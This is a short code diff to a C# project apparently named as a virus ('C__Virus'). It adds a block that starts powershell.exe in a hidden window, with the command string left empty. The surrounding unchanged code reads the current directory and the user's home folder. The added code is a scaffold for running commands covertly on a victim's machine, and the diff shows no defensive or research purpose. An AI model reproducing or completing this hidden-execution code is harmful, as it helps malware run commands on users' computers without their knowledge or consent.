@@ -9,9 +9,25 @@ namespace C__Virus
     {
         static void Main(string[] args)
         {
-            
+
             try
             {
+
+
+
+
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                string Command = "";
+                startInfo.FileName = "powershell.exe";
+                startInfo.Arguments = $"-Command \"{Command}\"";
+                process.StartInfo = startInfo;
+                process.Start();
+
+
+
+
                 string path = Directory.GetCurrentDirectory();
                 string homedir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 string fileName = "sclk";
@@ -68,5 +84,5 @@ namespace C__Virus
             }
         }
     }
-} 
+}
 
